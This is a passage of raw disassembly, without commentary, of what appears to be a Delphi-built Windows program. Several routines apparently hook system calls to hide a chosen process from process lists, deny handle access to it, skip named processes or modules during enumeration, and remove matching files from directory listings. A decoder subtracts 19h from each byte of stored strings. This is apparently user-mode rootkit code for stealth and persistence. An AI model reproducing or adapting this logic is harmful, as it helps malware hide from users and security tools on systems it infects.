		push	[ebp+var_8]
		push	[ebp+var_4]
		push	offset dword_414D1C
		push	[ebp+var_C]
		mov	eax, offset dword_417718
		mov	edx, 4
		call	sub_403CE4
		push	[ebp+var_8]
		push	[ebp+var_4]
		push	offset dword_414D28
		push	[ebp+var_C]
		mov	eax, offset dword_41771C
		mov	edx, 4
		call	sub_403CE4
		mov	cl, 2Ch
		mov	edx, 0Ch
		mov	eax, ebx
		call	sub_413640
		mov	byte ptr ds:dword_4177C4+2, al
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_414C8A

loc_414C75:				; CODE XREF: sub_4149B8+2D0j
		lea	eax, [ebp+var_40]
		mov	edx, 10h
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_414C83:				; DATA XREF: sub_4149B8+13o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_414C75
; ---------------------------------------------------------------------------

loc_414C8A:				; CODE XREF: sub_4149B8+2CAj
					; DATA XREF: sub_4149B8+2B8o
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4149B8	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 1
dword_414C98	dd 30h,	0FFFFFFFFh, 6	; DATA XREF: sub_4149B8+60o
					; sub_4149B8+84o ...
dword_414CA4	dd 2F642F6Dh, 7979h, 0FFFFFFFFh, 0Ch ; DATA XREF: sub_4149B8+105o
dword_414CB4	dd 6D6D6D6Dh, 202C6420h, 79797979h, 0 ;	DATA XREF: sub_4149B8+132o
		dd 0FFFFFFFFh, 2
dword_414CCC	dd 6D61h, 0FFFFFFFFh, 2	; DATA XREF: sub_4149B8+172o
dword_414CD8	dd 6D70h, 0FFFFFFFFh, 1	; DATA XREF: sub_4149B8+194o
dword_414CE4	dd 68h,	0FFFFFFFFh, 2	; DATA XREF: sub_4149B8+1E8o
dword_414CF0	dd 6868h, 0FFFFFFFFh, 5	; DATA XREF: sub_4149B8+1F7o
dword_414CFC	dd 504D4120h, 4Dh, 0FFFFFFFFh, 5 ; DATA	XREF: sub_4149B8+24Ao
dword_414D0C	dd 4D504D41h, 20h, 0FFFFFFFFh, 3 ; DATA	XREF: sub_4149B8+259o
dword_414D1C	dd 6D6D3Ah, 0FFFFFFFFh,	6 ; DATA XREF: sub_4149B8+269o
dword_414D28	dd 3A6D6D3Ah, 7373h	; DATA XREF: sub_4149B8+286o

; =============== S U B	R O U T	I N E =======================================


sub_414D30	proc near		; CODE XREF: sub_41508C+27p
		push	ebx
		mov	ebx, offset dword_416D04
		jmp	short loc_414D48
; ---------------------------------------------------------------------------

loc_414D38:				; CODE XREF: sub_414D30+1Bj
		mov	eax, [ebx]
		mov	edx, [eax]
		mov	[ebx], edx
		mov	edx, 8
		call	sub_402540

loc_414D48:				; CODE XREF: sub_414D30+6j
		cmp	dword ptr [ebx], 0
		jnz	short loc_414D38
		pop	ebx
		retn
sub_414D30	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_414D50	proc near		; CODE XREF: sub_41520C+50p
		push	ebx
		push	offset aKernel32_dll ; "kernel32.dll"
		call	GetModuleHandleA_0
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_414D71
		push	offset aGetdiskfreespa ; "GetDiskFreeSpaceExA"
		push	ebx		; hModule
		call	GetProcAddress_0
		mov	ds:dword_416B5C, eax

loc_414D71:				; CODE XREF: sub_414D50+Fj
		cmp	ds:dword_416B5C, 0
		jnz	short loc_414D84
		mov	eax, offset sub_412A50
		mov	ds:dword_416B5C, eax

loc_414D84:				; CODE XREF: sub_414D50+28j
		pop	ebx
		retn
sub_414D50	endp

; ---------------------------------------------------------------------------
		align 4
; char aKernel32_dll[13]
aKernel32_dll	db 'kernel32.dll',0     ; DATA XREF: sub_414D50+1o
		align 4
; char aGetdiskfreespa[]
aGetdiskfreespa	db 'GetDiskFreeSpaceExA',0 ; DATA XREF: sub_414D50+11o

; =============== S U B	R O U T	I N E =======================================


sub_414DAC	proc near		; CODE XREF: sub_41508C+22p
		mov	edx, [eax]
		xor	ecx, ecx
		mov	[eax], ecx
		mov	eax, edx
		call	sub_402D18
		retn
sub_414DAC	endp

; ---------------------------------------------------------------------------
		align 4
dword_414DBC	dd 1Dh			; DATA XREF: sub_41520C+1Ao
		dd offset dword_416CFC
		dd offset off_416E08
		dd offset dword_416CF4
		dd offset off_416DC0
		dd offset dword_416CEC
		dd offset off_416D2C
		dd offset dword_416CE4
		dd offset off_416E1C
		dd offset dword_416CDC
		dd offset off_416E30
		dd offset dword_416CD4
		dd offset off_416D78
		dd offset dword_416CCC
		dd offset off_416DB8
		dd offset dword_416CC4
		dd offset off_416D0C
		dd offset dword_416CBC
		dd offset off_416DC8
		dd offset dword_416CB4
		dd offset off_416DD4
		dd offset dword_416CAC
		dd offset off_416D9C
		dd offset dword_416CA4
		dd offset off_416DA4
		dd offset dword_416C9C
		dd offset off_416E50
		dd offset dword_416C94
		dd offset off_416DA0
		dd offset dword_416C8C
		dd offset off_416E74
		dd offset dword_416C84
		dd offset off_416DFC
		dd offset dword_416C7C
		dd offset off_416DE8
		dd offset dword_416C74
		dd offset off_416E78
		dd offset dword_416C6C
		dd offset off_416E64
		dd offset dword_416C64
		dd offset off_416DB0
		dd offset dword_416C5C
		dd offset off_416E54
		dd offset dword_416C54
		dd offset off_416E58
		dd offset dword_416C4C
		dd offset off_416D6C
		dd offset dword_416C44
		dd offset off_416D40
		dd offset dword_416C3C
		dd offset off_416DE4
		dd offset dword_416C34
		dd offset off_416E18
		dd offset dword_416C2C
		dd offset off_416D10
		dd offset dword_416C24
		dd offset off_416E4C
		dd offset dword_416C1C
		dd offset off_416DAC
dword_414EA8	dd 28h			; DATA XREF: sub_41520C+24o
		dd offset off_416C14
		dd offset off_416E44
		align 8
		dd offset off_416C10
		dd offset off_416D30
		dd 0
		dd offset off_416C0C
		dd offset off_416E14
		align 10h
		dd offset off_416C08
		dd offset off_416D1C
		dd 0
		dd offset off_416C04
		dd offset off_416D4C
		dd 0
		dd offset off_416C00
		dd offset off_416D44
		dd 0
		dd offset off_416BFC
		dd offset off_416D38
		align 10h
		dd offset off_416BF8
		dd offset off_416DA8
		dd 0
		dd offset off_416BF4
		dd offset off_416DF8
		align 8
		dd offset off_416BF0
		dd offset off_416D48
		dd 0
		dd offset off_416BEC
		dd offset off_416DE0
		align 10h
		dd offset off_416BE8
		dd offset off_416E2C
		dd 0
		dd offset off_416BE4
		dd offset off_416E24
		align 8
		dd offset off_416BE0
		dd offset off_416E00
		dd 0
		dd offset off_416BDC
		dd offset off_416D98
		align 10h
		dd offset off_416BD8
		dd offset off_416D84
		dd 0
		dd offset off_416BD4
		dd offset off_416D18
		align 8
		dd offset off_416BD0
		dd offset off_416E20
		dd 0
		dd offset off_416BCC
		dd offset off_416DD0
		align 10h
		dd offset off_416BC8
		dd offset off_416D7C
		dd 0
		dd offset off_416BC4
		dd offset off_416DC4
		align 8
		dd offset off_416BC0
		dd offset off_416DF0
		dd 0
		dd offset off_416BBC
		dd offset off_416DCC
		align 10h
		dd offset off_416BB8
		dd offset off_416D8C
		dd 0
		dd offset off_416BB4
		dd offset off_416D14
		align 8
		dd offset off_416BB0
		dd offset off_416DBC
		dd 0
		dd offset off_416BAC
		dd offset off_416E5C
		align 10h
		dd offset off_416BA8
		dd offset off_416E40
		dd 0
		dd offset off_416BA4
		dd offset off_416DDC
		align 8
		dd offset off_416BA0
		dd offset off_416D68
		dd 0
		dd offset off_416B9C
		dd offset off_416D24
		align 10h
		dd offset off_416B98
		dd offset off_416E38
		dd 0
		dd offset off_416B94
		dd offset off_416E80
		dd 0
		dd offset off_416B90
		dd offset off_416D3C
		dd 0
		dd offset off_416B8C
		dd offset off_416D08
		align 10h
		dd offset off_416B88
		dd offset off_416E48
		dd 0
		dd offset off_416B84
		dd offset off_416DD8
		align 8
		dd offset off_416B80
		dd offset off_416E68
		dd 0
		dd offset off_416B6C
		dd offset off_416DB4
		align 10h
		dd offset off_416B68
		dd offset off_416D70
		dd 0

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41508C	proc near		; DATA XREF: CODE:00415BE0o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_415201
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417808
		jnz	loc_4151F3
		mov	eax, offset dword_417814
		call	sub_414DAC
		call	sub_414D30
		call	sub_4144F0
		mov	eax, offset off_416C50
		mov	ecx, 16h
		mov	edx, off_413FC8
		call	sub_4040E8
		mov	eax, offset dword_416C18
		mov	ecx, 7
		mov	edx, off_413F48
		call	sub_4040E8
		mov	eax, offset off_416B60
		mov	ecx, 2
		mov	edx, off_401018
		call	sub_4040E8
		mov	eax, offset off_416B58
		call	sub_403994
		mov	eax, offset dword_417804
		mov	edx, off_4127F0
		call	sub_404724
		mov	eax, offset dword_417800
		mov	edx, off_4127CC
		call	sub_404724
		mov	eax, offset dword_4177C8
		mov	ecx, 7
		mov	edx, off_401018
		call	sub_4040E8
		mov	eax, offset dword_41779C
		mov	ecx, 7
		mov	edx, off_401018
		call	sub_4040E8
		mov	eax, offset dword_417780
		mov	ecx, 7
		mov	edx, off_401018
		call	sub_4040E8
		mov	eax, offset dword_417750
		mov	ecx, 0Ch
		mov	edx, off_401018
		call	sub_4040E8
		mov	eax, offset dword_417720
		mov	ecx, 0Ch
		mov	edx, off_401018
		call	sub_4040E8
		mov	eax, offset dword_41771C
		call	sub_403994
		mov	eax, offset dword_417718
		call	sub_403994
		mov	eax, offset dword_417714
		call	sub_403994
		mov	eax, offset dword_417710
		call	sub_403994
		mov	eax, offset dword_417708
		call	sub_403994
		mov	eax, offset dword_417704
		call	sub_403994
		mov	eax, offset dword_4176F8
		call	sub_403994
		mov	eax, offset dword_416B34
		call	sub_403994
		mov	eax, offset dword_416B20
		call	sub_403F78
		mov	eax, offset dword_416B1C
		call	sub_403994

loc_4151F3:				; CODE XREF: sub_41508C+17j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_415208

loc_415200:				; CODE XREF: sub_41508C+17Aj
		retn
; ---------------------------------------------------------------------------

loc_415201:				; DATA XREF: sub_41508C+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415200
; ---------------------------------------------------------------------------

loc_415208:				; CODE XREF: sub_41508C:loc_415200j
					; DATA XREF: sub_41508C+16Fo
		pop	ebp
		retn
sub_41508C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41520C	proc near		; DATA XREF: CODE:00415BDCo
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_415274
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		sub	ds:dword_417808, 1
		jnb	short loc_415266
		mov	eax, offset dword_414DBC
		call	sub_403740
		mov	eax, offset dword_414EA8
		call	sub_403768
		cmp	ds:byte_41765D,	0
		jz	short loc_415252
		mov	eax, offset off_416B58
		mov	edx, offset dword_415288
		call	sub_4039E8

loc_415252:				; CODE XREF: sub_41520C+35j
		call	sub_41446C
		call	sub_414570
		call	sub_414D50
		call	sub_4149B8

loc_415266:				; CODE XREF: sub_41520C+18j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_41527B

loc_415273:				; CODE XREF: sub_41520C+6Dj
		retn
; ---------------------------------------------------------------------------

loc_415274:				; DATA XREF: sub_41520C+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415273
; ---------------------------------------------------------------------------

loc_41527B:				; CODE XREF: sub_41520C:loc_415273j
					; DATA XREF: sub_41520C+62o
		pop	ebp
		retn
sub_41520C	endp

; ---------------------------------------------------------------------------
		align 10h
		dd 0FFFFFFFFh, 2
dword_415288	dd 7830h		; DATA XREF: sub_41520C+3Co

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41528C	proc near		; DATA XREF: CODE:00415BE8o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_4152B1
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417818
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4152B8

loc_4152B0:				; CODE XREF: sub_41528C+2Aj
		retn
; ---------------------------------------------------------------------------

loc_4152B1:				; DATA XREF: sub_41528C+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4152B0
; ---------------------------------------------------------------------------

loc_4152B8:				; CODE XREF: sub_41528C:loc_4152B0j
					; DATA XREF: sub_41528C+1Fo
		pop	ebp
		retn
sub_41528C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4152BC	proc near		; DATA XREF: CODE:00415BE4o
		sub	ds:dword_417818, 1
		retn
sub_4152BC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4152C4	proc near		; DATA XREF: CODE:00415C8Fo

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		push	edi
		mov	esi, [ebp+arg_4]
		mov	ebx, [ebp+arg_0]
		xor	edi, edi
		push	ebp
		push	offset loc_415356
		push	dword ptr fs:[edi]
		mov	fs:[edi], esp
		mov	eax, [ebp+arg_C]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		push	esi
		push	ebx
		call	ds:dword_41805C
		mov	[ebp+var_4], eax
		cmp	ebx, 5
		jz	short loc_415303
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_415360
; ---------------------------------------------------------------------------

loc_415303:				; CODE XREF: sub_4152C4+33j
		cmp	[ebp+var_4], 0
		jz	short loc_415313
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_415360
; ---------------------------------------------------------------------------

loc_415313:				; CODE XREF: sub_4152C4+43j
		xor	edx, edx

loc_415315:				; CODE XREF: sub_4152C4+86j
		lea	eax, [esi+edx]
		mov	ecx, [eax+44h]
		cmp	ecx, ds:dword_417838
		jnz	short loc_415341
		mov	ecx, [eax]
		test	ecx, ecx
		jnz	short loc_41533A
		mov	eax, [ebp+var_8]
		xor	edx, edx
		mov	[eax], edx
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_415360
; ---------------------------------------------------------------------------

loc_41533A:				; CODE XREF: sub_4152C4+63j
		mov	ebx, [ebp+var_8]
		add	[ebx], ecx
		jmp	short loc_415344
; ---------------------------------------------------------------------------

loc_415341:				; CODE XREF: sub_4152C4+5Dj
		mov	[ebp+var_8], eax

loc_415344:				; CODE XREF: sub_4152C4+7Bj
		mov	ecx, [eax]
		add	edx, ecx
		test	ecx, ecx
		jnz	short loc_415315
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_415360
; ---------------------------------------------------------------------------

loc_415356:				; DATA XREF: sub_4152C4+12o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_415360:				; CODE XREF: sub_4152C4+3Dj
					; sub_4152C4+4Dj ...
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn	10h
sub_4152C4	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_41536C(HANDLE hSourceHandle, int)
sub_41536C	proc near		; DATA XREF: CODE:00415CB7o

hSourceHandle	= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+hSourceHandle]
		push	ebx		; hSourceHandle
		call	sub_40BB64
		cmp	eax, ds:dword_417838
		jnz	short loc_415388
		mov	eax, 0C0000022h
		jmp	short loc_415393
; ---------------------------------------------------------------------------

loc_415388:				; CODE XREF: sub_41536C+13j
		mov	eax, [ebp+arg_4]
		push	eax
		push	ebx
		call	ds:dword_418070

loc_415393:				; CODE XREF: sub_41536C+1Aj
		pop	ebx
		pop	ebp
		retn	8
sub_41536C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_415398	proc near		; DATA XREF: CODE:00415C40o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	ebx, [ebp+arg_4]
		mov	edi, [ebp+arg_0]

loc_4153A4:				; CODE XREF: sub_415398+86j
		push	ebx
		push	edi
		call	ds:dword_418060
		mov	esi, eax
		mov	eax, ds:dword_417828
		call	sub_403E24
		push	eax		; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiA
		test	eax, eax
		jz	short loc_415412
		mov	eax, ds:dword_41782C
		call	sub_403E24
		push	eax		; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiA
		test	eax, eax
		jz	short loc_415412
		mov	eax, ds:dword_417824
		call	sub_403E24
		push	eax		; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiA
		test	eax, eax
		jz	short loc_415412
		mov	eax, ds:dword_417830
		call	sub_403E24
		push	eax		; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiA
		test	eax, eax
		jz	short loc_415412
		xor	eax, eax
		jmp	short loc_415414
; ---------------------------------------------------------------------------

loc_415412:				; CODE XREF: sub_415398+2Cj
					; sub_415398+44j ...
		mov	al, 1

loc_415414:				; CODE XREF: sub_415398+78j
		neg	al
		sbb	eax, eax
		test	esi, esi
		jz	short loc_415420
		test	eax, eax
		jnz	short loc_4153A4

loc_415420:				; CODE XREF: sub_415398+82j
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
sub_415398	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41542C	proc near		; DATA XREF: CODE:00415C5Bo

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		mov	ebx, [ebp+arg_4]
		mov	edi, [ebp+arg_0]

loc_415438:				; CODE XREF: sub_41542C+6Ej
		push	ebx
		push	edi
		call	ds:dword_418064
		mov	esi, eax
		push	offset String2	; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiW
		test	eax, eax
		jz	short loc_41548E
		push	offset word_417A44 ; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiW
		test	eax, eax
		jz	short loc_41548E
		push	offset word_417E54 ; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiW
		test	eax, eax
		jz	short loc_41548E
		push	offset word_417C4C ; lpString2
		lea	eax, [ebx+2Ch]
		push	eax		; lpString1
		call	lstrcmpiW
		test	eax, eax
		jz	short loc_41548E
		xor	eax, eax
		jmp	short loc_415490
; ---------------------------------------------------------------------------

loc_41548E:				; CODE XREF: sub_41542C+26j
					; sub_41542C+38j ...
		mov	al, 1

loc_415490:				; CODE XREF: sub_41542C+60j
		neg	al
		sbb	eax, eax
		test	esi, esi
		jz	short loc_41549C
		test	eax, eax
		jnz	short loc_415438

loc_41549C:				; CODE XREF: sub_41542C+6Aj
		mov	eax, esi
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	8
sub_41542C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4154A8	proc near		; DATA XREF: CODE:00415CFBo

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h
arg_1C		= dword	ptr  24h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		xor	edx, edx
		push	ebp
		push	offset loc_415565
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		mov	eax, [ebp+arg_1C]
		push	eax
		mov	eax, [ebp+arg_18]
		push	eax
		mov	eax, [ebp+arg_14]
		push	eax
		mov	eax, [ebp+arg_10]
		push	eax
		mov	eax, [ebp+arg_C]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		call	ds:dword_418068
		mov	[ebp+var_4], eax
		cmp	[ebp+var_4], 0
		jz	short loc_41555B
		mov	ebx, [ebp+arg_C]
		mov	edi, [ebp+arg_18]
		mov	edi, [edi]
		dec	edi
		test	edi, edi
		jl	short loc_41555B
		inc	edi
		xor	esi, esi

loc_4154FC:				; CODE XREF: sub_4154A8+B1j
		mov	eax, ds:dword_417834
		call	sub_403E24
		mov	edx, eax
		mov	eax, [ebx]
		call	sub_412B20
		test	eax, eax
		jnz	short loc_415554
		mov	eax, [ebp+arg_C]
		mov	ebx, [ebp+arg_C]
		lea	edx, [esi+1]
		shl	edx, 2
		lea	edx, [edx+edx*8]
		add	eax, edx
		mov	edx, esi
		shl	edx, 2
		lea	edx, [edx+edx*8]
		add	ebx, edx
		mov	edx, [ebp+arg_18]
		mov	edx, [edx]
		sub	edx, esi
		dec	edx
		mov	ecx, edx
		shl	ecx, 2
		lea	ecx, [ecx+ecx*8]
		mov	edx, eax
		mov	eax, ebx
		call	sub_40541C
		mov	eax, [ebp+arg_18]
		dec	dword ptr [eax]
		mov	eax, [ebp+arg_14]
		sub	dword ptr [eax], 24h
		jmp	short loc_41555B
; ---------------------------------------------------------------------------

loc_415554:				; CODE XREF: sub_4154A8+69j
		add	ebx, 24h
		inc	esi
		dec	edi
		jnz	short loc_4154FC

loc_41555B:				; CODE XREF: sub_4154A8+42j
					; sub_4154A8+4Fj ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_41556F
; ---------------------------------------------------------------------------

loc_415565:				; DATA XREF: sub_4154A8+Ao
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_41556F:				; CODE XREF: sub_4154A8+BBj
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	20h
sub_4154A8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41557C	proc near		; DATA XREF: CODE:00415CE0o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch
arg_18		= dword	ptr  20h
arg_1C		= dword	ptr  24h

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		push	ebp
		push	offset loc_41568F
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		xor	edx, edx
		push	ebp
		push	offset loc_41566A
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		mov	eax, [ebp+arg_1C]
		push	eax
		mov	eax, [ebp+arg_18]
		push	eax
		mov	eax, [ebp+arg_14]
		push	eax
		mov	eax, [ebp+arg_10]
		push	eax
		mov	eax, [ebp+arg_C]
		push	eax
		mov	eax, [ebp+arg_8]
		push	eax
		mov	eax, [ebp+arg_4]
		push	eax
		mov	eax, [ebp+arg_0]
		push	eax
		call	ds:dword_41806C
		mov	[ebp+var_4], eax
		cmp	[ebp+var_4], 0
		jz	loc_415660
		mov	ebx, [ebp+arg_C]
		mov	edi, [ebp+arg_18]
		mov	edi, [edi]
		dec	edi
		test	edi, edi
		jl	short loc_415660
		inc	edi
		xor	esi, esi

loc_4155E7:				; CODE XREF: sub_41557C+E2j
		lea	eax, [ebp+var_C]
		mov	edx, [ebx]
		call	sub_403BBC
		mov	eax, [ebp+var_C]
		lea	edx, [ebp+var_8]
		call	sub_412844
		mov	eax, [ebp+var_8]
		push	eax
		lea	edx, [ebp+var_10]
		mov	eax, ds:dword_417834
		call	sub_412844
		mov	edx, [ebp+var_10]
		pop	eax
		call	sub_403D70
		jnz	short loc_415659
		mov	eax, [ebp+arg_C]
		mov	ebx, [ebp+arg_C]
		mov	edx, esi
		shl	edx, 2
		lea	edx, [edx+edx*8]
		add	ebx, edx
		lea	edx, [esi+1]
		shl	edx, 2
		lea	edx, [edx+edx*8]
		add	eax, edx
		mov	edx, [ebp+arg_18]
		mov	edx, [edx]
		sub	edx, esi
		dec	edx
		mov	ecx, edx
		shl	ecx, 2
		lea	ecx, [ecx+ecx*8]
		mov	edx, eax
		mov	eax, ebx
		call	sub_40541C
		mov	eax, [ebp+arg_18]
		dec	dword ptr [eax]
		mov	eax, [ebp+arg_14]
		sub	dword ptr [eax], 24h
		jmp	short loc_415660
; ---------------------------------------------------------------------------

loc_415659:				; CODE XREF: sub_41557C+9Aj
		add	ebx, 24h
		inc	esi
		dec	edi
		jnz	short loc_4155E7

loc_415660:				; CODE XREF: sub_41557C+55j
					; sub_41557C+66j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_415674
; ---------------------------------------------------------------------------

loc_41566A:				; DATA XREF: sub_41557C+1Do
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_415674:				; CODE XREF: sub_41557C+ECj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_415696

loc_415681:				; CODE XREF: sub_41557C+118j
		lea	eax, [ebp+var_10]
		mov	edx, 3
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_41568F:				; DATA XREF: sub_41557C+Fo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_415681
; ---------------------------------------------------------------------------

loc_415696:				; CODE XREF: sub_41557C+112j
					; DATA XREF: sub_41557C+100o
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	20h
sub_41557C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4156A4	proc near		; CODE XREF: CODE:00415A3Dp

Filename	= byte ptr -108h

		push	ebx
		add	esp, 0FFFFFEFCh
		mov	ebx, eax
		mov	eax, ds:off_416D20
		cmp	byte ptr [eax],	0
		jz	short loc_4156D7
		push	104h		; nSize
		lea	eax, [esp+10Ch+Filename]
		push	eax		; lpFilename
		mov	eax, ds:hModule
		push	eax		; hModule
		call	GetModuleFileNameA_0
		mov	ecx, eax
		mov	edx, esp
		mov	eax, ebx
		call	sub_403A84

loc_4156D7:				; CODE XREF: sub_4156A4+11j
		add	esp, 104h
		pop	ebx
		retn
sub_4156A4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4156E0	proc near		; CODE XREF: sub_4157B4+4Dp
					; CODE:0041593Ep ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		xor	ecx, ecx
		push	ecx
		push	ecx
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, edx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_4157A6
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, edi
		mov	edx, [ebp+var_4]
		call	sub_4039E8
		jmp	short loc_41578B
; ---------------------------------------------------------------------------
		cmp	[ebp+var_4], 0
		jz	short loc_415784
		mov	eax, [ebp+var_4]
		call	sub_403C24
		mov	edx, [ebp+var_4]
		xor	ebx, ebx
		mov	bl, [edx+eax-1]
		sub	ebx, 19h
		lea	eax, [ebp+var_C]
		mov	edx, ebx
		call	sub_403B7C
		mov	edx, [ebp+var_C]
		lea	eax, [ebp+var_8]
		call	sub_403C2C
		mov	eax, [ebp+var_4]
		call	sub_403C24
		mov	ebx, eax
		dec	ebx
		test	ebx, ebx
		jle	short loc_415778
		mov	esi, 1

loc_415756:				; CODE XREF: sub_4156E0+96j
		lea	eax, [ebp+var_10]
		mov	edx, [ebp+var_4]
		movzx	edx, byte ptr [edx+esi-1]
		sub	edx, 19h
		call	sub_403B7C
		mov	edx, [ebp+var_10]
		lea	eax, [ebp+var_8]
		call	sub_403C2C
		inc	esi
		dec	ebx
		jnz	short loc_415756

loc_415778:				; CODE XREF: sub_4156E0+6Fj
		mov	eax, edi
		mov	edx, [ebp+var_8]
		call	sub_4039E8
		jmp	short loc_41578B
; ---------------------------------------------------------------------------

loc_415784:				; CODE XREF: sub_4156E0+37j
		mov	eax, edi
		call	sub_403994

loc_41578B:				; CODE XREF: sub_4156E0+31j
					; sub_4156E0+A2j
		xor	eax, eax
